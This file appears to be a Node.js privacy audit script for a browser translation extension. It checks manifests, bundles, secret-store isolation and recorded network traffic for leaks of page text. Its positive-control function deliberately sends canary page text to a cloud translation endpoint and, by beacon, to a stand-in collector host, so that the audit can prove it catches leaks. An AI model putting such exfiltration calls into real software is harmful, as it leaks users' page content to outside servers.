#!/usr/bin/env node
// تدقيق شبكة مسار الترجمة (T-4.5، F-C6؛ AC-C6، TEST-PRIV-01). يجمع فحصين:
//  - ساكن (static): المانيفست (الصلاحيات ومضيفاتها واختياريها وCSP) في المصدر والبناء، والشيفرة المصدرية (واجهات الشبكة في مسار الترجمة)، والحزمة المبنية (مضيفات
//    الترجمة السحابية وآثار ONNX وWebAssembly وtrial.ml). النتيجة تُكتب في evidence/T-4.5/static-audit.{json,txt}.
//  - ديناميكي (dynamic): تشغيل ترجمة كامل بالحزمة المشحونة (dist/chromium) في Chrome وEdge وBrave بملف تعريف مؤقت جديد، على عينة إنجليزية تُقدَّم من
//    https://github.com/octo/mijhar-demo/issues/7 باعتراض الطلب (لا يخرج شيء من الجهاز: كل طلب آخر يُحجب بعد تسجيله)، وسجل شبكة CDP لكل الأهداف
//    (الصفحة وعامل الإضافة وصفحاتها) خلال التشغيل كله؛ فكل طلب في النافذة يُنسب إلى الإضافة أو المتصفح لا إلى الصفحة (العينة ساكنة بلا موارد). ثم ضابط إيجابي:
//    طلب تسريب متعمد يجب أن يكشفه التدقيق، ليثبت أن الأداة ترى ما تدّعي غيابه.
//    Firefox: لا رصد شبكة (Marionette لا يرصدها) فيُسجَّل «لم يُجرَ» بسببه؛ ويبقى فحصه ساكنًا.
//  - MJ23 (T-11.10، AC-E10 (١)، I-2): عزل المحوّلات والأسرار في الحزم المبنية: ترويسات كل محوّل ومساراته (PROVIDER_ADAPTER_MARKERS) في background.js وحده،
//    ومخزن الأسرار (SECRET_STORE_MARKERS) في background.js وoptions.js وحدهما؛ وأي ظهور في حزمة أخرى (content وreader وsidepanel) مخالفة. ضمن static،
//    ووحده بالوضع providers.
// الاستعمال: node scripts/network-audit.mjs static|dynamic|all|providers [chrome edge brave] [--out-dir evidence/T-4.5]
// يتطلب dist مبنيًا (npm run build).
import fs from 'node:fs';
import net from 'node:net';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { attachNetworkRecorder, auditBundle, auditManifest, auditSources, auditWindow, browserWsUrl, TRANSLATION_PATH_DIRS } from '../src/modules/c/network-audit/index.mjs';
import { launchChromium, machineInfo, sleep, waitFor, writeJson } from './spikes/lib.mjs';

export const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
export const PAGE = { href: 'https://github.com/octo/mijhar-demo/issues/7', fixture: 'tests/modules/c/ui/fixtures/fixture-translate-en.html' };
/** عبارات من نص العينة لا تظهر في أي طلب إلا إن خرج نص الصفحة. */
export const CANARIES = [
  'This extension helps Arabic readers understand repositories',
  'The side panel opens from the toolbar',
  'I can reproduce this with',
  'and the fix is not in that build yet',
];
/** ما يطلبه الاختبار والمتصفح للصفحة نفسها لا الإضافة: مستند العينة الذي يقدّمه الاعتراض، وأيقونة الصفحة. وما عداه في النافذة كلها (من بدء التحميل) يُدقَّق. */
const HARNESS_BASELINE = [PAGE.href, 'https://github.com/favicon.ico'];
const isBaseline = (r) => r.method === 'GET' && r.target?.type === 'page' && HARNESS_BASELINE.includes(r.url);
const README = '[data-case="readme"]';
const COMMENT1 = '[data-case="comment-body-1"]';
const ISSUE = '[data-case="issue-description"]';
const NOT_READY = 'لم يجهز مترجم المتصفح بعد';
const AVAILABILITY = "Translator.availability({ sourceLanguage: 'en', targetLanguage: 'ar' })";

// ——— الفحص الساكن ———

function walk(dir, accept, out = []) {
  for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
    const full = path.join(dir, entry.name);
    if (entry.isDirectory()) walk(full, accept, out);
    else if (accept(full)) out.push(full);
  }
  return out;
}

const read = (file) => fs.readFileSync(path.join(ROOT, file), 'utf8');
const rel = (file) => path.relative(ROOT, file);

/**
 * علامات كل محوّل مزوّد في السجل (src/modules/e/provider/registry.ts): أسماء ترويساته ومسارات طلباته كما في ملفه وحده. يفرض اختبار ساكن أن لكل محوّل
 * مدموج علاماته هنا وأنها في ملفه وحده من src؛ وإضافة محوّل تضيف سطره. ونص طلب التحقق المعلن (في السجل الوصفي) لا يحمل علامة منها.
 */
export const PROVIDER_ADAPTER_MARKERS = /** @type {Readonly<Record<string, readonly string[]>>} */ ({
  anthropic: ['anthropic-dangerous-direct-browser-access', 'anthropic-version', 'x-api-key', '/v1/messages', '/v1/models?limit='],
});
/** علامات مخزن الأسرار: اسم قاعدة IndexedDB وبادئة مفاتيح storage.session (src/core/connections/secrets.ts وkeys.ts). */
export const SECRET_STORE_MARKERS = /** @type {readonly string[]} */ (['mijhar-secrets', 'mijhar.secret.']);
const ADAPTER_BUNDLES = ['background.js'];
const SECRET_BUNDLES = ['background.js', 'options.js'];

/** عزل المحوّلات والأسرار في حزمة مبنية واحدة (dist/<target>، أو مجلد يُمرَّر للضابط الإيجابي). */
export function providerIsolation(target, dir = path.join(ROOT, 'dist', target)) {
  if (!fs.existsSync(dir)) return { target, missing: `dist/${target}`, findings: [] };
  const files = walk(dir, (f) => f.endsWith('.js')).map((f) => ({ name: path.relative(dir, f), text: fs.readFileSync(f, 'utf8') }));
  /** @type {Finding[]} */
  const findings = [];
  const where = (marker) => files.filter((f) => f.text.includes(marker)).map((f) => f.name);
  const adapters = {};
  for (const [provider, markers] of Object.entries(PROVIDER_ADAPTER_MARKERS)) {
    adapters[provider] = Object.fromEntries(markers.map((m) => [m, where(m)]));
    for (const [marker, found] of Object.entries(adapters[provider])) {
      for (const name of found) if (!ADAPTER_BUNDLES.includes(name)) findings.push({ severity: 'violation', rule: 'adapter-outside-background', where: `dist/${target}/${name}`, detail: `علامة محوّل ${provider} (${marker}) خارج الخلفية` });
      if (!found.length) findings.push({ severity: 'violation', rule: 'adapter-missing', where: `dist/${target}`, detail: `علامة محوّل ${provider} (${marker}) غائبة عن الحزم: العلامات لا تطابق المحوّل` });
    }
  }
  const secrets = Object.fromEntries(SECRET_STORE_MARKERS.map((m) => [m, where(m)]));
  for (const [marker, found] of Object.entries(secrets)) for (const name of found) if (!SECRET_BUNDLES.includes(name)) findings.push({ severity: 'violation', rule: 'secret-store-outside-trusted', where: `dist/${target}/${name}`, detail: `علامة مخزن الأسرار (${marker}) خارج الخلفية وصفحة الإعدادات` });
  return { target, files: files.map((f) => f.name), adapters, secrets, findings };
}

export function providerIsolationText(results) {
  const lines = [`# عزل المحوّلات والأسرار في الحزم المبنية (I-2، AC-E10 (١)) — ${new Date().toISOString()}`, ''];
  for (const r of results) {
    if (r.missing) {
      lines.push(`الحزمة ${r.target}: غير موجودة (${r.missing}) — لم تُفحص`, '');
      continue;
    }
    lines.push(`الحزمة ${r.target} (${r.files.join(' · ')}):`);
    for (const [provider, markers] of Object.entries(r.adapters)) for (const [m, found] of Object.entries(markers)) lines.push(`  محوّل ${provider} «${m}»: ${found.join(', ') || '—'}`);
    for (const [m, found] of Object.entries(r.secrets)) lines.push(`  مخزن الأسرار «${m}»: ${found.join(', ') || '—'}`);
    lines.push('');
  }
  const violations = results.flatMap((r) => r.findings);
  lines.push(`المخالفات: ${violations.length}`);
  for (const v of violations) lines.push(`  ✗ [${v.rule}] ${v.where}: ${v.detail}`);
  lines.push('', violations.length === 0 ? 'النتيجة: اجتاز (ترويسات المحوّلات ومساراتها في background.js وحده، ومخزن الأسرار في الخلفية والإعدادات وحدهما).' : 'النتيجة: سقط.');
  return lines.join('\n');
}

export function staticAudit() {
  const manifests = {};
  for (const [name, file] of [
    ['source/chromium', 'src/manifest/chromium.json'],
    ['source/firefox', 'src/manifest/firefox.json'],
    ['built/chromium', 'dist/chromium/manifest.json'],
    ['built/firefox', 'dist/firefox/manifest.json'],
  ]) {
    if (!fs.existsSync(path.join(ROOT, file))) {
      manifests[name] = { missing: file };
      continue;
    }
    manifests[name] = { file, ...auditManifest(JSON.parse(read(file))) };
  }
  const sources = walk(path.join(ROOT, 'src'), (f) => /\.(ts|tsx)$/.test(f) && !f.endsWith('.d.ts')).map((f) => ({ path: rel(f), text: fs.readFileSync(f, 'utf8') }));
  const sourceAudit = auditSources(sources);
  const bundles = {};
  for (const target of ['chromium', 'firefox']) {
    const dir = path.join(ROOT, 'dist', target);
    if (!fs.existsSync(dir)) {
      bundles[target] = { missing: `dist/${target}` };
      continue;
    }
    const files = walk(dir, (f) => f.endsWith('.js')).map((f) => ({ path: rel(f), text: fs.readFileSync(f, 'utf8') }));
    bundles[target] = auditBundle(files);
  }
  const isolation = ['chromium', 'firefox'].map((t) => providerIsolation(t));
  const all = [
    ...Object.values(manifests).flatMap((m) => m.findings ?? []),
    ...sourceAudit.findings,
    ...Object.values(bundles).flatMap((b) => b.findings ?? []),
    ...isolation.flatMap((r) => r.findings),
  ];
  return {
    measuredAt: new Date().toISOString(),
    translationPathDirs: TRANSLATION_PATH_DIRS,
    manifests,
    sources: { scanned: sourceAudit.scanned, translationPathFiles: sourceAudit.translationPathFiles, networkUsage: sourceAudit.networkUsage, urlsByFile: sourceAudit.urlsByFile },
    bundles,
    providerIsolation: isolation,
    findings: all,
    violations: all.filter((f) => f.severity === 'violation'),
    warnings: all.filter((f) => f.severity === 'warning'),
  };
}

export function staticText(result) {
  const lines = [`# فحص ساكن لمسار الترجمة — ${result.measuredAt}`, ''];
  for (const [name, m] of Object.entries(result.manifests)) {
    if (m.missing) {
      lines.push(`المانيفست ${name}: غير موجود (${m.missing}) — لم يُفحص`, '');
      continue;
    }
    lines.push(`المانيفست ${name} (${m.file}):`);
    lines.push(`  permissions: ${JSON.stringify(m.permissions)} · optional_permissions: ${JSON.stringify(m.optionalPermissions)}`);
    lines.push(`  مضيفات: ${m.hosts.map((h) => `${h.host} [${h.where}]`).join(' · ') || '—'}`);
    lines.push(`  CSP: ${m.csp.join(' | ') || 'لا CSP مخصص (الافتراضي لصفحات الإضافة في MV3)'}`);
    lines.push(`  مخالفات: ${m.findings.filter((f) => f.severity === 'violation').length} · تحذيرات: ${m.findings.filter((f) => f.severity === 'warning').length}`, '');
  }
  const onPath = Object.entries(result.sources.networkUsage).filter(([p]) => TRANSLATION_PATH_DIRS.some((d) => p.startsWith(d)));
  lines.push(`المصدر: ${result.sources.scanned} ملفًا، منها ${result.sources.translationPathFiles} في مسار الترجمة (${TRANSLATION_PATH_DIRS.join(' ')})`);
  lines.push(`  واجهات الشبكة في مسار الترجمة: ${onPath.length ? onPath.map(([p, apis]) => `${p}: ${apis.join(',')}`).join(' · ') : 'لا شيء'}`);
  lines.push('  واجهات الشبكة خارج المسار (جرد):');
  for (const [p, apis] of Object.entries(result.sources.networkUsage)) if (!TRANSLATION_PATH_DIRS.some((d) => p.startsWith(d))) lines.push(`    ${p}: ${apis.join(',')}`);
  lines.push('');
  for (const [target, b] of Object.entries(result.bundles)) {
    if (b.missing) {
      lines.push(`الحزمة ${target}: غير موجودة (${b.missing}) — لم تُفحص`);
      continue;
    }
    lines.push(`الحزمة ${target}:`);
    for (const [p, s] of Object.entries(b.summary)) lines.push(`  ${p}: ${s.bytes} حرفًا · مضيفات: ${s.hosts.join(',') || '—'} · واجهات شبكة: ${s.networkApis.join(',') || '—'}`);
  }
  lines.push('', `المخالفات: ${result.violations.length}`);
  for (const v of result.violations) lines.push(`  ✗ [${v.rule}] ${v.where}: ${v.detail}`);
  lines.push(`التحذيرات: ${result.warnings.length}`);
  for (const w of result.warnings) lines.push(`  ! [${w.rule}] ${w.where}: ${w.detail}`);
  lines.push('', result.violations.length === 0 ? 'النتيجة: اجتاز (لا مخالفة).' : 'النتيجة: سقط.');
  return lines.join('\n');
}

// ——— الحزمة المشحونة في المتصفح ———

const freePort = () =>
  new Promise((resolve, reject) => {
    const server = net.createServer();
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      server.close(() => resolve(port));
    });
    server.on('error', reject);
  });

/**
 * يفتح متصفح Chromium بالحزمة المشحونة، ويقدّم العينة من عنوان GitHub باعتراض الطلب، ويسجّل الشبكة من كل الأهداف.
 * كل طلب http(s) آخر يُسجَّل في blocked ويُحجب (لا يخرج شيء من الجهاز).
 */
export async function launchShipped(key, { record = true } = {}) {
  const port = record ? await freePort() : null;
  const launched = await launchChromium(key, { extension: path.join(ROOT, 'dist/chromium'), ...(port ? { args: [`--remote-debugging-port=${port}`] } : {}) });
  const { context } = launched;
  await context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: 'https://github.com' });
  const recorder = record ? await attachNetworkRecorder(await browserWsUrl(port)) : null;
  const html = fs.readFileSync(path.join(ROOT, PAGE.fixture), 'utf8');
  const pagePath = new URL(PAGE.href).pathname;
  const blocked = [];
  await context.route(/^https?:\/\//, async (route) => {
    const request = route.request();
    const url = new URL(request.url());
    if (request.isNavigationRequest() && url.origin === 'https://github.com' && url.pathname === pagePath) {
      await route.fulfill({ status: 200, contentType: 'text/html; charset=utf-8', body: html });
      return;
    }
    blocked.push({ url: request.url(), method: request.method(), type: request.resourceType() });
    await route.abort('blockedbyclient');
  });
  await sleep(300);
  const page = await context.newPage();
  // المسجّل يلحق بالهدف الجديد غير المتزامن؛ ننتظر قبل أول تنقل كي لا يفوته أول طلب.
  await sleep(700);
  return {
    key,
    context,
    page,
    recorder,
    blocked,
    version: launched.version,
    async close() {
      await recorder?.stop();
      await launched.close();
    },
  };
}

// ——— دوال تُنفَّذ في الصفحة (العالم الرئيسي يرى جذور الظل المفتوحة) ———

export function barsFn() {
  const ARABIC = /[؀-ۿ]/;
  return [...document.querySelectorAll('mijhar-host[data-mijhar-host="c.ui.bar"]')].map((host, index) => {
    const root = host.shadowRoot;
    let body = host.nextElementSibling;
    while (body && body.localName === 'mijhar-host') body = body.nextElementSibling;
    const hosts = body ? [...body.querySelectorAll('mijhar-host[data-mijhar-host="c.ui.translation"]')] : [];
    const texts = hosts.filter((h) => h.getAttribute('data-kind') === 'translation').map((h) => h.shadowRoot?.querySelector('.tr-body')?.textContent ?? '');
    return {
      index,
      case: body?.getAttribute('data-case') ?? null,
      phase: root?.querySelector('.bar')?.getAttribute('data-phase'),
      note: root?.querySelector('[data-note]')?.textContent?.replace(/\s+/g, ' ').trim(),
      consent: root?.querySelector('[data-consent]')?.textContent?.replace(/\s+/g, ' ').trim() ?? null,
      actions: [...(root?.querySelectorAll('button') ?? [])].map((b) => b.getAttribute('data-action') ?? b.getAttribute('data-mode')),
      translations: texts.length,
      warnings: hosts.filter((h) => h.getAttribute('data-kind') === 'warning').length,
      arabic: texts.filter((t) => ARABIC.test(t)).length,
      tokenLeak: texts.some((t) => /[⟦⟧]|\{\d+\}|\[\[\d+\]\]/.test(t)),
    };
  });
}

export function buttonFn(arg) {
  const body = document.querySelector(arg.selector);
  let host = body?.previousElementSibling;
  while (host && host.localName === 'mijhar-host' && host.getAttribute('data-mijhar-host') !== 'c.ui.bar') host = host.previousElementSibling;
  const el = host?.shadowRoot?.querySelector(`[data-action="${arg.action}"]`);
  if (!el) return null;
  el.scrollIntoView({ block: 'center', behavior: 'instant' });
  const r = el.getBoundingClientRect();
  return { x: Math.round(r.x + r.width / 2), y: Math.round(r.y + r.height / 2) };
}

export function dragFn(arg) {
  const el = document.querySelector(arg.selector);
  if (!el) return null;
  el.scrollIntoView({ block: 'center', behavior: 'instant' });
  const first = document.createTreeWalker(el, NodeFilter.SHOW_TEXT).nextNode();
  if (!first) return null;
  const a = document.createRange();
  a.setStart(first, 0);
  a.setEnd(first, 1);
  const s = a.getBoundingClientRect();
  const b = document.createRange();
  b.setStart(first, 0);
  b.setEnd(first, Math.min(arg.chars, first.length));
  const rects = b.getClientRects();
  const e = rects[rects.length - 1];
  return { x1: Math.round(s.left + 1), y1: Math.round(s.top + s.height / 2), x2: Math.round(e.right), y2: Math.round(e.top + e.height / 2) };
}

export function selectionFn() {
  const root = document.querySelector('mijhar-host[data-mijhar-host="c.ui.selection"]')?.shadowRoot;
  const at = (el) => {
    if (!el) return null;
    const r = el.getBoundingClientRect();
    return { x: Math.round(r.x + r.width / 2), y: Math.round(r.y + r.height / 2) };
  };
  const card = root?.querySelector('.sel-card');
  const translation = card?.querySelector('[data-section="translation"]')?.textContent ?? null;
  return {
    selected: document.getSelection()?.toString() ?? '',
    button: at(root?.querySelector('[data-action="translate-selection"]')),
    copyButton: at(root?.querySelector('[data-action="copy-masked"]')),
    confirmButton: at(root?.querySelector('[data-action="consent-confirm"]')),
    declineButton: at(root?.querySelector('[data-action="consent-decline"]')),
    card: card && {
      status: card.getAttribute('data-status'),
      translation,
      arabic: /[؀-ۿ]/.test(translation ?? ''),
      notice: card.querySelector('[data-section="notice"]')?.textContent ?? null,
      consent: card.querySelector('[data-consent]')?.textContent?.replace(/\s+/g, ' ').trim() ?? null,
      copyNote: card.querySelector('[data-section="copy-note"]')?.textContent ?? null,
    },
  };
}

// ——— مشغّل الصفحة ———

/** مشغّل فوق صفحة Playwright: قراءة الأشرطة ونقر فعلي بالفأرة وتحديد بالسحب. */
export function driver(page) {
  const bars = () => page.evaluate(barsFn);
  return {
    bars,
    bar: async (selector) => (await bars()).find((b) => b.case === selector.match(/"(.+)"/)?.[1]),
    availability: () => page.evaluate(`typeof Translator === 'function' ? ${AVAILABILITY} : Promise.resolve(null)`).catch((e) => `error: ${e.message}`),
    async waitBars(timeout = 30000) {
      const list = await waitFor(async () => {
        const b = await bars();
        return b.length > 0 && b[0].note !== undefined ? b : null;
      }, timeout, 200);
      await sleep(800);
      return list && bars();
    },
    async click(selector, action) {
      await page.evaluate(buttonFn, { selector, action });
      await sleep(250);
      const at = await page.evaluate(buttonFn, { selector, action });
      if (!at) throw new Error(`لا زر ${action} في ${selector}`);
      await page.mouse.click(at.x, at.y);
    },
    async clickAt(at, what) {
      if (!at) throw new Error(`لا زر: ${what}`);
      await page.mouse.click(at.x, at.y);
    },
    async select(selector, chars) {
      const d = await page.evaluate(dragFn, { selector, chars });
      if (!d) throw new Error(`لا نص لتحديده في ${selector}`);
      await page.mouse.move(d.x1, d.y1);
      await page.mouse.down();
      await page.mouse.move(d.x2, d.y2, { steps: 8 });
      await page.mouse.up();
      await sleep(400);
      return page.evaluate(selectionFn);
    },
    selection: () => page.evaluate(selectionFn),
    clipboard: () => page.evaluate(() => navigator.clipboard.readText()).catch((e) => `خطأ: ${e.message}`),
  };
}

/** ينتظر نهاية جلسة شريط (done/error/empty). */
export async function settleBar(d, selector, timeout = 240000) {
  return waitFor(async () => {
    const b = await d.bar(selector);
    return b && ['done', 'error', 'empty'].includes(b.phase) ? b : null;
  }, timeout, 250);
}

export const isNotReady = (bar) => bar?.phase === 'error' && bar.note?.includes(NOT_READY);

// ——— الفحص الديناميكي ———

/** تشغيل ترجمة كامل بالمحرك الحقيقي (Chrome وBrave): بطاقة الاستئذان ثم التنزيل ثم الفقرات والتحديد. */
async function readyRun(b, d, log) {
  const steps = {};
  steps.availabilityAtMount = await d.availability();
  await sleep(3000);
  steps.availabilityAfterIdle = await d.availability();
  log('availability', steps.availabilityAtMount, steps.availabilityAfterIdle);

  await d.click(README, 'translate');
  await sleep(500);
  const card = await d.bar(README);
  steps.cardShown = { consent: card.consent, actions: card.actions };
  steps.availabilityWhileCard = await d.availability();
  await d.click(README, 'consent-decline');
  await sleep(300);
  steps.afterDecline = { consent: (await d.bar(README)).consent, availability: await d.availability() };

  const attempts = [];
  for (let attempt = 1; attempt <= 3; attempt += 1) {
    const t0 = Date.now();
    await d.click(README, 'translate');
    await sleep(400);
    if ((await d.bar(README)).consent) {
      await d.click(README, 'consent-confirm');
    }
    const bar = await settleBar(d, README);
    attempts.push({ attempt, ms: Date.now() - t0, phase: bar?.phase ?? 'timeout', note: bar?.note, translations: bar?.translations, warnings: bar?.warnings, arabic: bar?.arabic, tokenLeak: bar?.tokenLeak });
    if (!isNotReady(bar)) break;
    await sleep(15000);
  }
  steps.readme = attempts;
  steps.availabilityAfterTranslate = await d.availability();
  for (const [name, selector] of [['comment', COMMENT1], ['issue', ISSUE]]) {
    const t0 = Date.now();
    await d.click(selector, 'translate');
    const bar = await settleBar(d, selector);
    steps[name] = { ms: Date.now() - t0, phase: bar?.phase, translations: bar?.translations, warnings: bar?.warnings, arabic: bar?.arabic, tokenLeak: bar?.tokenLeak, consentShown: Boolean(bar?.consent) };
  }
  let sel = await d.select('[data-case="p-sentences"]', 38);
  if (sel.button) {
    await d.clickAt(sel.button, 'translate-selection');
    sel = await waitFor(async () => {
      const s = await d.selection();
      return s.card && s.card.status !== 'working' ? s : null;
    }, 60000, 250);
  }
  steps.selection = sel?.card ?? { error: 'لا زر «ترجمة المحدد»' };
  log('translated', steps.readme.at(-1)?.phase, steps.comment?.phase, steps.issue?.phase, steps.selection?.status);
  return steps;
}

/** حيث لا محرك (Edge: unavailable): الحالة الصريحة وبديل النسخ المقنَّع بلا اتصال. */
async function unavailableRun(b, d, log) {
  const steps = {};
  steps.bar = await d.bar(README);
  await d.click(README, 'translate');
  await sleep(400);
  steps.afterTranslate = await d.bar(README);
  await d.click(README, 'copy-masked');
  await sleep(500);
  steps.afterCopy = await d.bar(README);
  steps.clipboard = (await d.clipboard()).slice(0, 300);
  let sel = await d.select('[data-case="p-sentences"]', 38);
  if (sel.button) {
    await d.clickAt(sel.button, 'translate-selection');
    await sleep(500);
    sel = await d.selection();
    steps.selection = sel.card;
    if (sel.copyButton) {
      await d.clickAt(sel.copyButton, 'copy-masked (selection)');
      await sleep(400);
      steps.selectionCopyNote = (await d.selection()).card?.copyNote;
    }
  }
  log('unavailable', steps.bar?.note?.slice(0, 80));
  return steps;
}

/** ضابط إيجابي: طلبان تسريبيان متعمدان من العالم الرئيسي؛ يجب أن يكشفهما التدقيق (مضيف ترجمة سحابي، ونص الصفحة في العنوان وفي الجسم). */
async function leakControl(page) {
  await page.evaluate(
    ([canaryA, canaryB]) => {
      fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=en&tl=ar&q=${encodeURIComponent(canaryA)}`).catch(() => {});
      navigator.sendBeacon('https://collector.invalid/log', canaryB);
    },
    [CANARIES[0], CANARIES[1]],
  );
  await sleep(800);
}

export async function dynamicAudit(key, { log = () => {} } = {}) {
  const b = await launchShipped(key);
  const out = { key, version: b.version };
  const t = {};
  try {
    const d = driver(b.page);
    t.loadStart = Date.now();
    await b.page.goto(PAGE.href, { waitUntil: 'load' });
    await b.page.waitForLoadState('networkidle').catch(() => {});
    const bars = await d.waitBars();
    t.runStart = Date.now();
    out.mounted = bars?.map(({ index, case: c, phase, note }) => ({ index, case: c, phase, note }));
    const ready = Boolean(bars?.length) && !bars[0].note?.startsWith('المحرك غير متاح');
    out.engineReady = ready;
    out.steps = ready ? await readyRun(b, d, (...a) => log(key, ...a)) : await unavailableRun(b, d, (...a) => log(key, ...a));
    await sleep(1500);
    t.runEnd = Date.now();
    await leakControl(b.page);
    t.controlEnd = Date.now();

    const all = b.recorder.snapshot();
    const whole = b.recorder.between(t.loadStart, t.runEnd);
    const baseline = whole.filter(isBaseline);
    const audited = whole.filter((r) => !isBaseline(r));
    const control = b.recorder.between(t.runEnd + 1, t.controlEnd);
    const brief = (list) => list.map(({ url, method, type, target }) => ({ url: url.length > 160 ? `${url.slice(0, 160)}…` : url, method, type, target }));
    out.targets = b.recorder.targets();
    out.windows = {
      baseline: { note: 'ما يطلبه الاختبار والمتصفح للصفحة نفسها (مستند العينة وأيقونتها)، لا الإضافة', requests: brief(baseline) },
      run: {
        note: 'من بدء تحميل العينة حتى نهاية الترجمة والتحديد والنسخ (التركيب والاستئذان والتنزيل والفقرات) بعد استبعاد baseline: لا طلب شبكة مسموح ولا أثر من نص الصفحة',
        ...auditWindow(audited, CANARIES),
        requests: brief(audited),
      },
      control: { note: 'ضابط إيجابي: طلبان تسريبيان متعمدان يجب أن يُكشفا', ...auditWindow(control, CANARIES) },
    };
    out.control = {
      detectedCloudHost: out.windows.control.violations.some((v) => v.rule === 'cloud-translation-host'),
      detectedHostNotAllowed: out.windows.control.violations.some((v) => v.rule === 'host-not-allowed'),
      leaks: out.windows.control.leaks.length,
      detected: !out.windows.control.pass,
    };
    out.blockedByHarness = b.blocked;
    out.totalRecorded = all.length;
    out.fullLog = all.map(({ url, method, type, target, t: ts }) => ({ url, method, type, target, t: ts - t.loadStart }));
    out.extensionTargetsSeen = out.targets.filter((x) => /^(chrome|edge|brave)?-?extension:|chrome-extension:/.test(x.url ?? '')).length;
  } catch (error) {
    out.error = String(error.stack ?? error);
  } finally {
    await b.close();
  }
  return out;
}

// ——— الاستعمال من سطر الأوامر ———

async function main() {
  const args = process.argv.slice(2);
  const outIndex = args.indexOf('--out-dir');
  const outDir = path.resolve(ROOT, outIndex === -1 ? 'evidence/T-4.5' : args.splice(outIndex, 2)[1]);
  const mode = args.shift() ?? 'all';
  const keys = args.length ? args : ['chrome', 'edge', 'brave'];
  fs.mkdirSync(outDir, { recursive: true });
  let failed = false;
  if (mode === 'providers') {
    const results = ['chromium', 'firefox'].map((t) => providerIsolation(t));
    writeJson(path.join(outDir, 'provider-isolation.json'), results);
    fs.writeFileSync(path.join(outDir, 'provider-isolation.txt'), `${providerIsolationText(results)}\n`);
    console.error(providerIsolationText(results).split('\n').slice(-3).join('\n'));
    failed ||= results.some((r) => r.missing || r.findings.length > 0);
  }
  if (mode === 'static' || mode === 'all') {
    const result = staticAudit();
    writeJson(path.join(outDir, 'static-audit.json'), result);
    fs.writeFileSync(path.join(outDir, 'static-audit.txt'), `${staticText(result)}\n`);
    console.error(staticText(result).split('\n').slice(-6).join('\n'));
    failed ||= result.violations.length > 0;
  }
  if (mode === 'dynamic' || mode === 'all') {
    const summary = { measuredAt: new Date().toISOString(), machine: machineInfo(), page: PAGE, canaries: CANARIES, results: [] };
    for (const key of keys) {
      const r = await dynamicAudit(key, { log: (...a) => console.error(...a) });
      summary.results.push({ key: r.key, version: r.version, engineReady: r.engineReady, run: r.windows && { network: r.windows.run.network, violations: r.windows.run.violations.length, leaks: r.windows.run.leaks.length, pass: r.windows.run.pass }, control: r.control, error: r.error });
      writeJson(path.join(outDir, `dynamic-${key}.json`), r);
      const w = r.windows?.run;
      console.error(`${key} ${r.version ?? ''}: ${r.error ? `خطأ: ${r.error.split('\n')[0]}` : `محرك ${r.engineReady ? 'جاهز' : 'غير متاح'} · طلبات الشبكة في التشغيل ${w?.network} · مخالفات ${w?.violations.length} · تسرب ${w?.leaks.length} · الضابط ${r.control?.detected ? 'كُشف' : 'لم يُكشف'}`}`);
      failed ||= Boolean(r.error) || !w?.pass || !r.control?.detected;
    }
    summary.firefox = { dynamic: 'لم يُجرَ', reason: 'Marionette لا يرصد الشبكة ولا يعترض الطلبات، فلا تُقدَّم العينة من عنوان GitHub ولا يُسجَّل سجل؛ يبقى فحصه ساكنًا (المانيفست والحزمة dist/firefox)' };
    writeJson(path.join(outDir, 'dynamic-results.json'), summary);
  }
  process.exitCode = failed ? 1 : 0;
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) await main();
